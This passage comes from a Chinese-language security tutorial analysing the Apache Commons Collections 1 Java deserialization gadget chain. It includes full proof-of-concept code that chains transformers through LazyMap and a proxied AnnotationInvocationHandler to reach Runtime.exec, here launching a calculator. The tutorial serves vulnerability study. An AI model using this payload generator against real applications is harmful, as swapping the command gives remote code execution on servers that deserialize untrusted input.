class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        out.defaultWriteObject();</span><br><span class="line">        out.writeObject(<span class="built_in">super</span>.map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="built_in">super</span>.map = (Map)in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到在<code>get()</code>方法中，检查<code>key</code>是否在<code>map</code>中，如果不存在就会调用<code>factory.transform()</code>方法生成<code>value</code>放进<code>map</code>中。我们从头跟起看看<code>factory</code>参数是什么内容。</p><p>POC 中从👇🏻开始进入<code>LazyMap</code>类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure></p><p>跟进<code>LazyMap</code>类的<code>decorate</code>方法，<code>return</code>到构造方法<code>LazyMap()</code>中，其中<code>factory</code>参数则是<code>ChainedTransformer</code>。<br><img src="images/image-20220920215913812.png" alt="image-20220920215913812"></p><p>到这里发现没有调用到<code>LazyMap</code>中的<code>get()</code>方法，那么关键的<code>get()</code>方法在哪里调用的？<code>ysoserial</code>中的<code>gadget</code>已经给了我们答案<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure></p><h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>在给出的<code>gadget</code>中，调用了<code>AnnotationInvocationHandler</code>类的<code>invoke()</code>方法之后能进入<code>get()</code>方法中，源码如下：<br><img src="images/image-20220920223014118.png" alt="image-20220920223014118"></p><p>接下来就是如何去调用到<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法，前辈们已经给出了解决方案就是使用动态代理的方式。</p><p>在前面 <a href="../../00-JavaSE/3-动态代理/动态代理.md">《动态代理》</a>章节我们已经学习过相关知识，这里写一个简单的 demo 回顾一下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.ProxyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/22 22:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;());</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line">        proxyMap.put(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> (String) proxyMap.get(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Map map;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Demo</span><span class="params">(Map map)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;get&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;dotast&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.map,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220922232016142.png" alt="image-20220922232016142"></p><p>从结果中可以看到，动态代理的对象执行方法的时候，转发到了实现接口<code>InvocationHandler</code>的<code>Demo</code>类里并执行<code>invoke()</code>方法，把我们存储的值<code>admin</code>改成了<code>dotast</code>，并打印出<code>success</code>字符串。</p><p>而<code>AnnotationInvocationHandler</code>类正好是实现了<code>InvocationHandler</code>接口的类，因此我们可以通过动态代理的方式去调用到<code>AnnotationInvocationHandler</code>类的<code>invoke()</code>方法<br><img src="images/image-20220922232441082.png" alt="image-20220922232441082"></p><p>因此我们可以写出初步的 POC：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/19 22:00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections1</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections1</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 设置方法访问权限</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">mapHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, mapHandler);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(proxyMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>但运行后，经过反序列化并不会执行命令弹出计算器。断点调试一下，发现<code>memberValues</code>变量的赋值为<code>LazyMap</code><br><img src="images/image-20220926111006320.png" alt="image-20220926111006320"></p><p>因此在经过<code>this.memberValues.entrySet().iterator();</code>步入到<code>var4.next()</code>执行方法时，无法进入<code>AnnotationInvocationHandler</code>类的<code>invoke()</code>方法<br><img src="images/image-20220926111405695.png" alt="image-20220926111405695"></p><p>所以我们需要再创建一次<code>AnnotationInvocationHandler</code>，触发我们前面的代理对象，最终 POC如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/19 22:00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections1</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections1</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 设置方法访问权限</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">mapHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, mapHandler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, proxyMap);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(handler);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220926150336993.png" alt="image-20220926150336993"></p><p>通过把前面的<code>proxyMap</code>作为构造方法的参数传入，此时的<code>memberValues</code>为我们的代理对象<code>proxyMap</code>，也就是<code>AnnotationInvocationHandler</code>实例<br><img src="images/image-20220926150831689.png" alt="image-20220926150831689"></p><p>经过<code>this.memberValues.entrySet()</code>步入到<code>var4.next()</code>之后，成功进入到被代理的<code>AnnotationInvocationHandler</code>类的<code>invoke()</code>方法中。</p><p>此时的<code>memberValues</code>参数值就是前面第一次代理的时候的<code>LazyMap</code>，因此可以调用到<code>LazyMap.get()</code>方法，触发命令执行。<br><img src="images/image-20220926151146196.png" alt="image-20220926151146196"></p><h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>在前面调试的时候，在未进入<code>readObject()</code>反序列化方法时，就弹出了计算器，原因是在第一次代理了<code>map</code>对象后，在执行<code>map</code>类的任意方法都会触发构造的<code>payload</code>，而由于<code>IDEA</code>中<code>Debug</code>的过程中会调用到代理类的<code>toString</code>方法从而造成非预期的命令执行。</p><p>解决方案是取消掉这两处的✅<br><img src="images/image-20220926151832327.png" alt="image-20220926151832327"></p><p>当前也可以参照<code>ysoserial</code>的处理<br><img src="images/image-20221005001535438.png" alt="image-20221005001535438"></p><p>先在开头设置一个没有危害的对象，在最后进行序列化的时候再把真正具有危害的<code>transformers</code>数组替换，从而避免了非预期的 rce<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 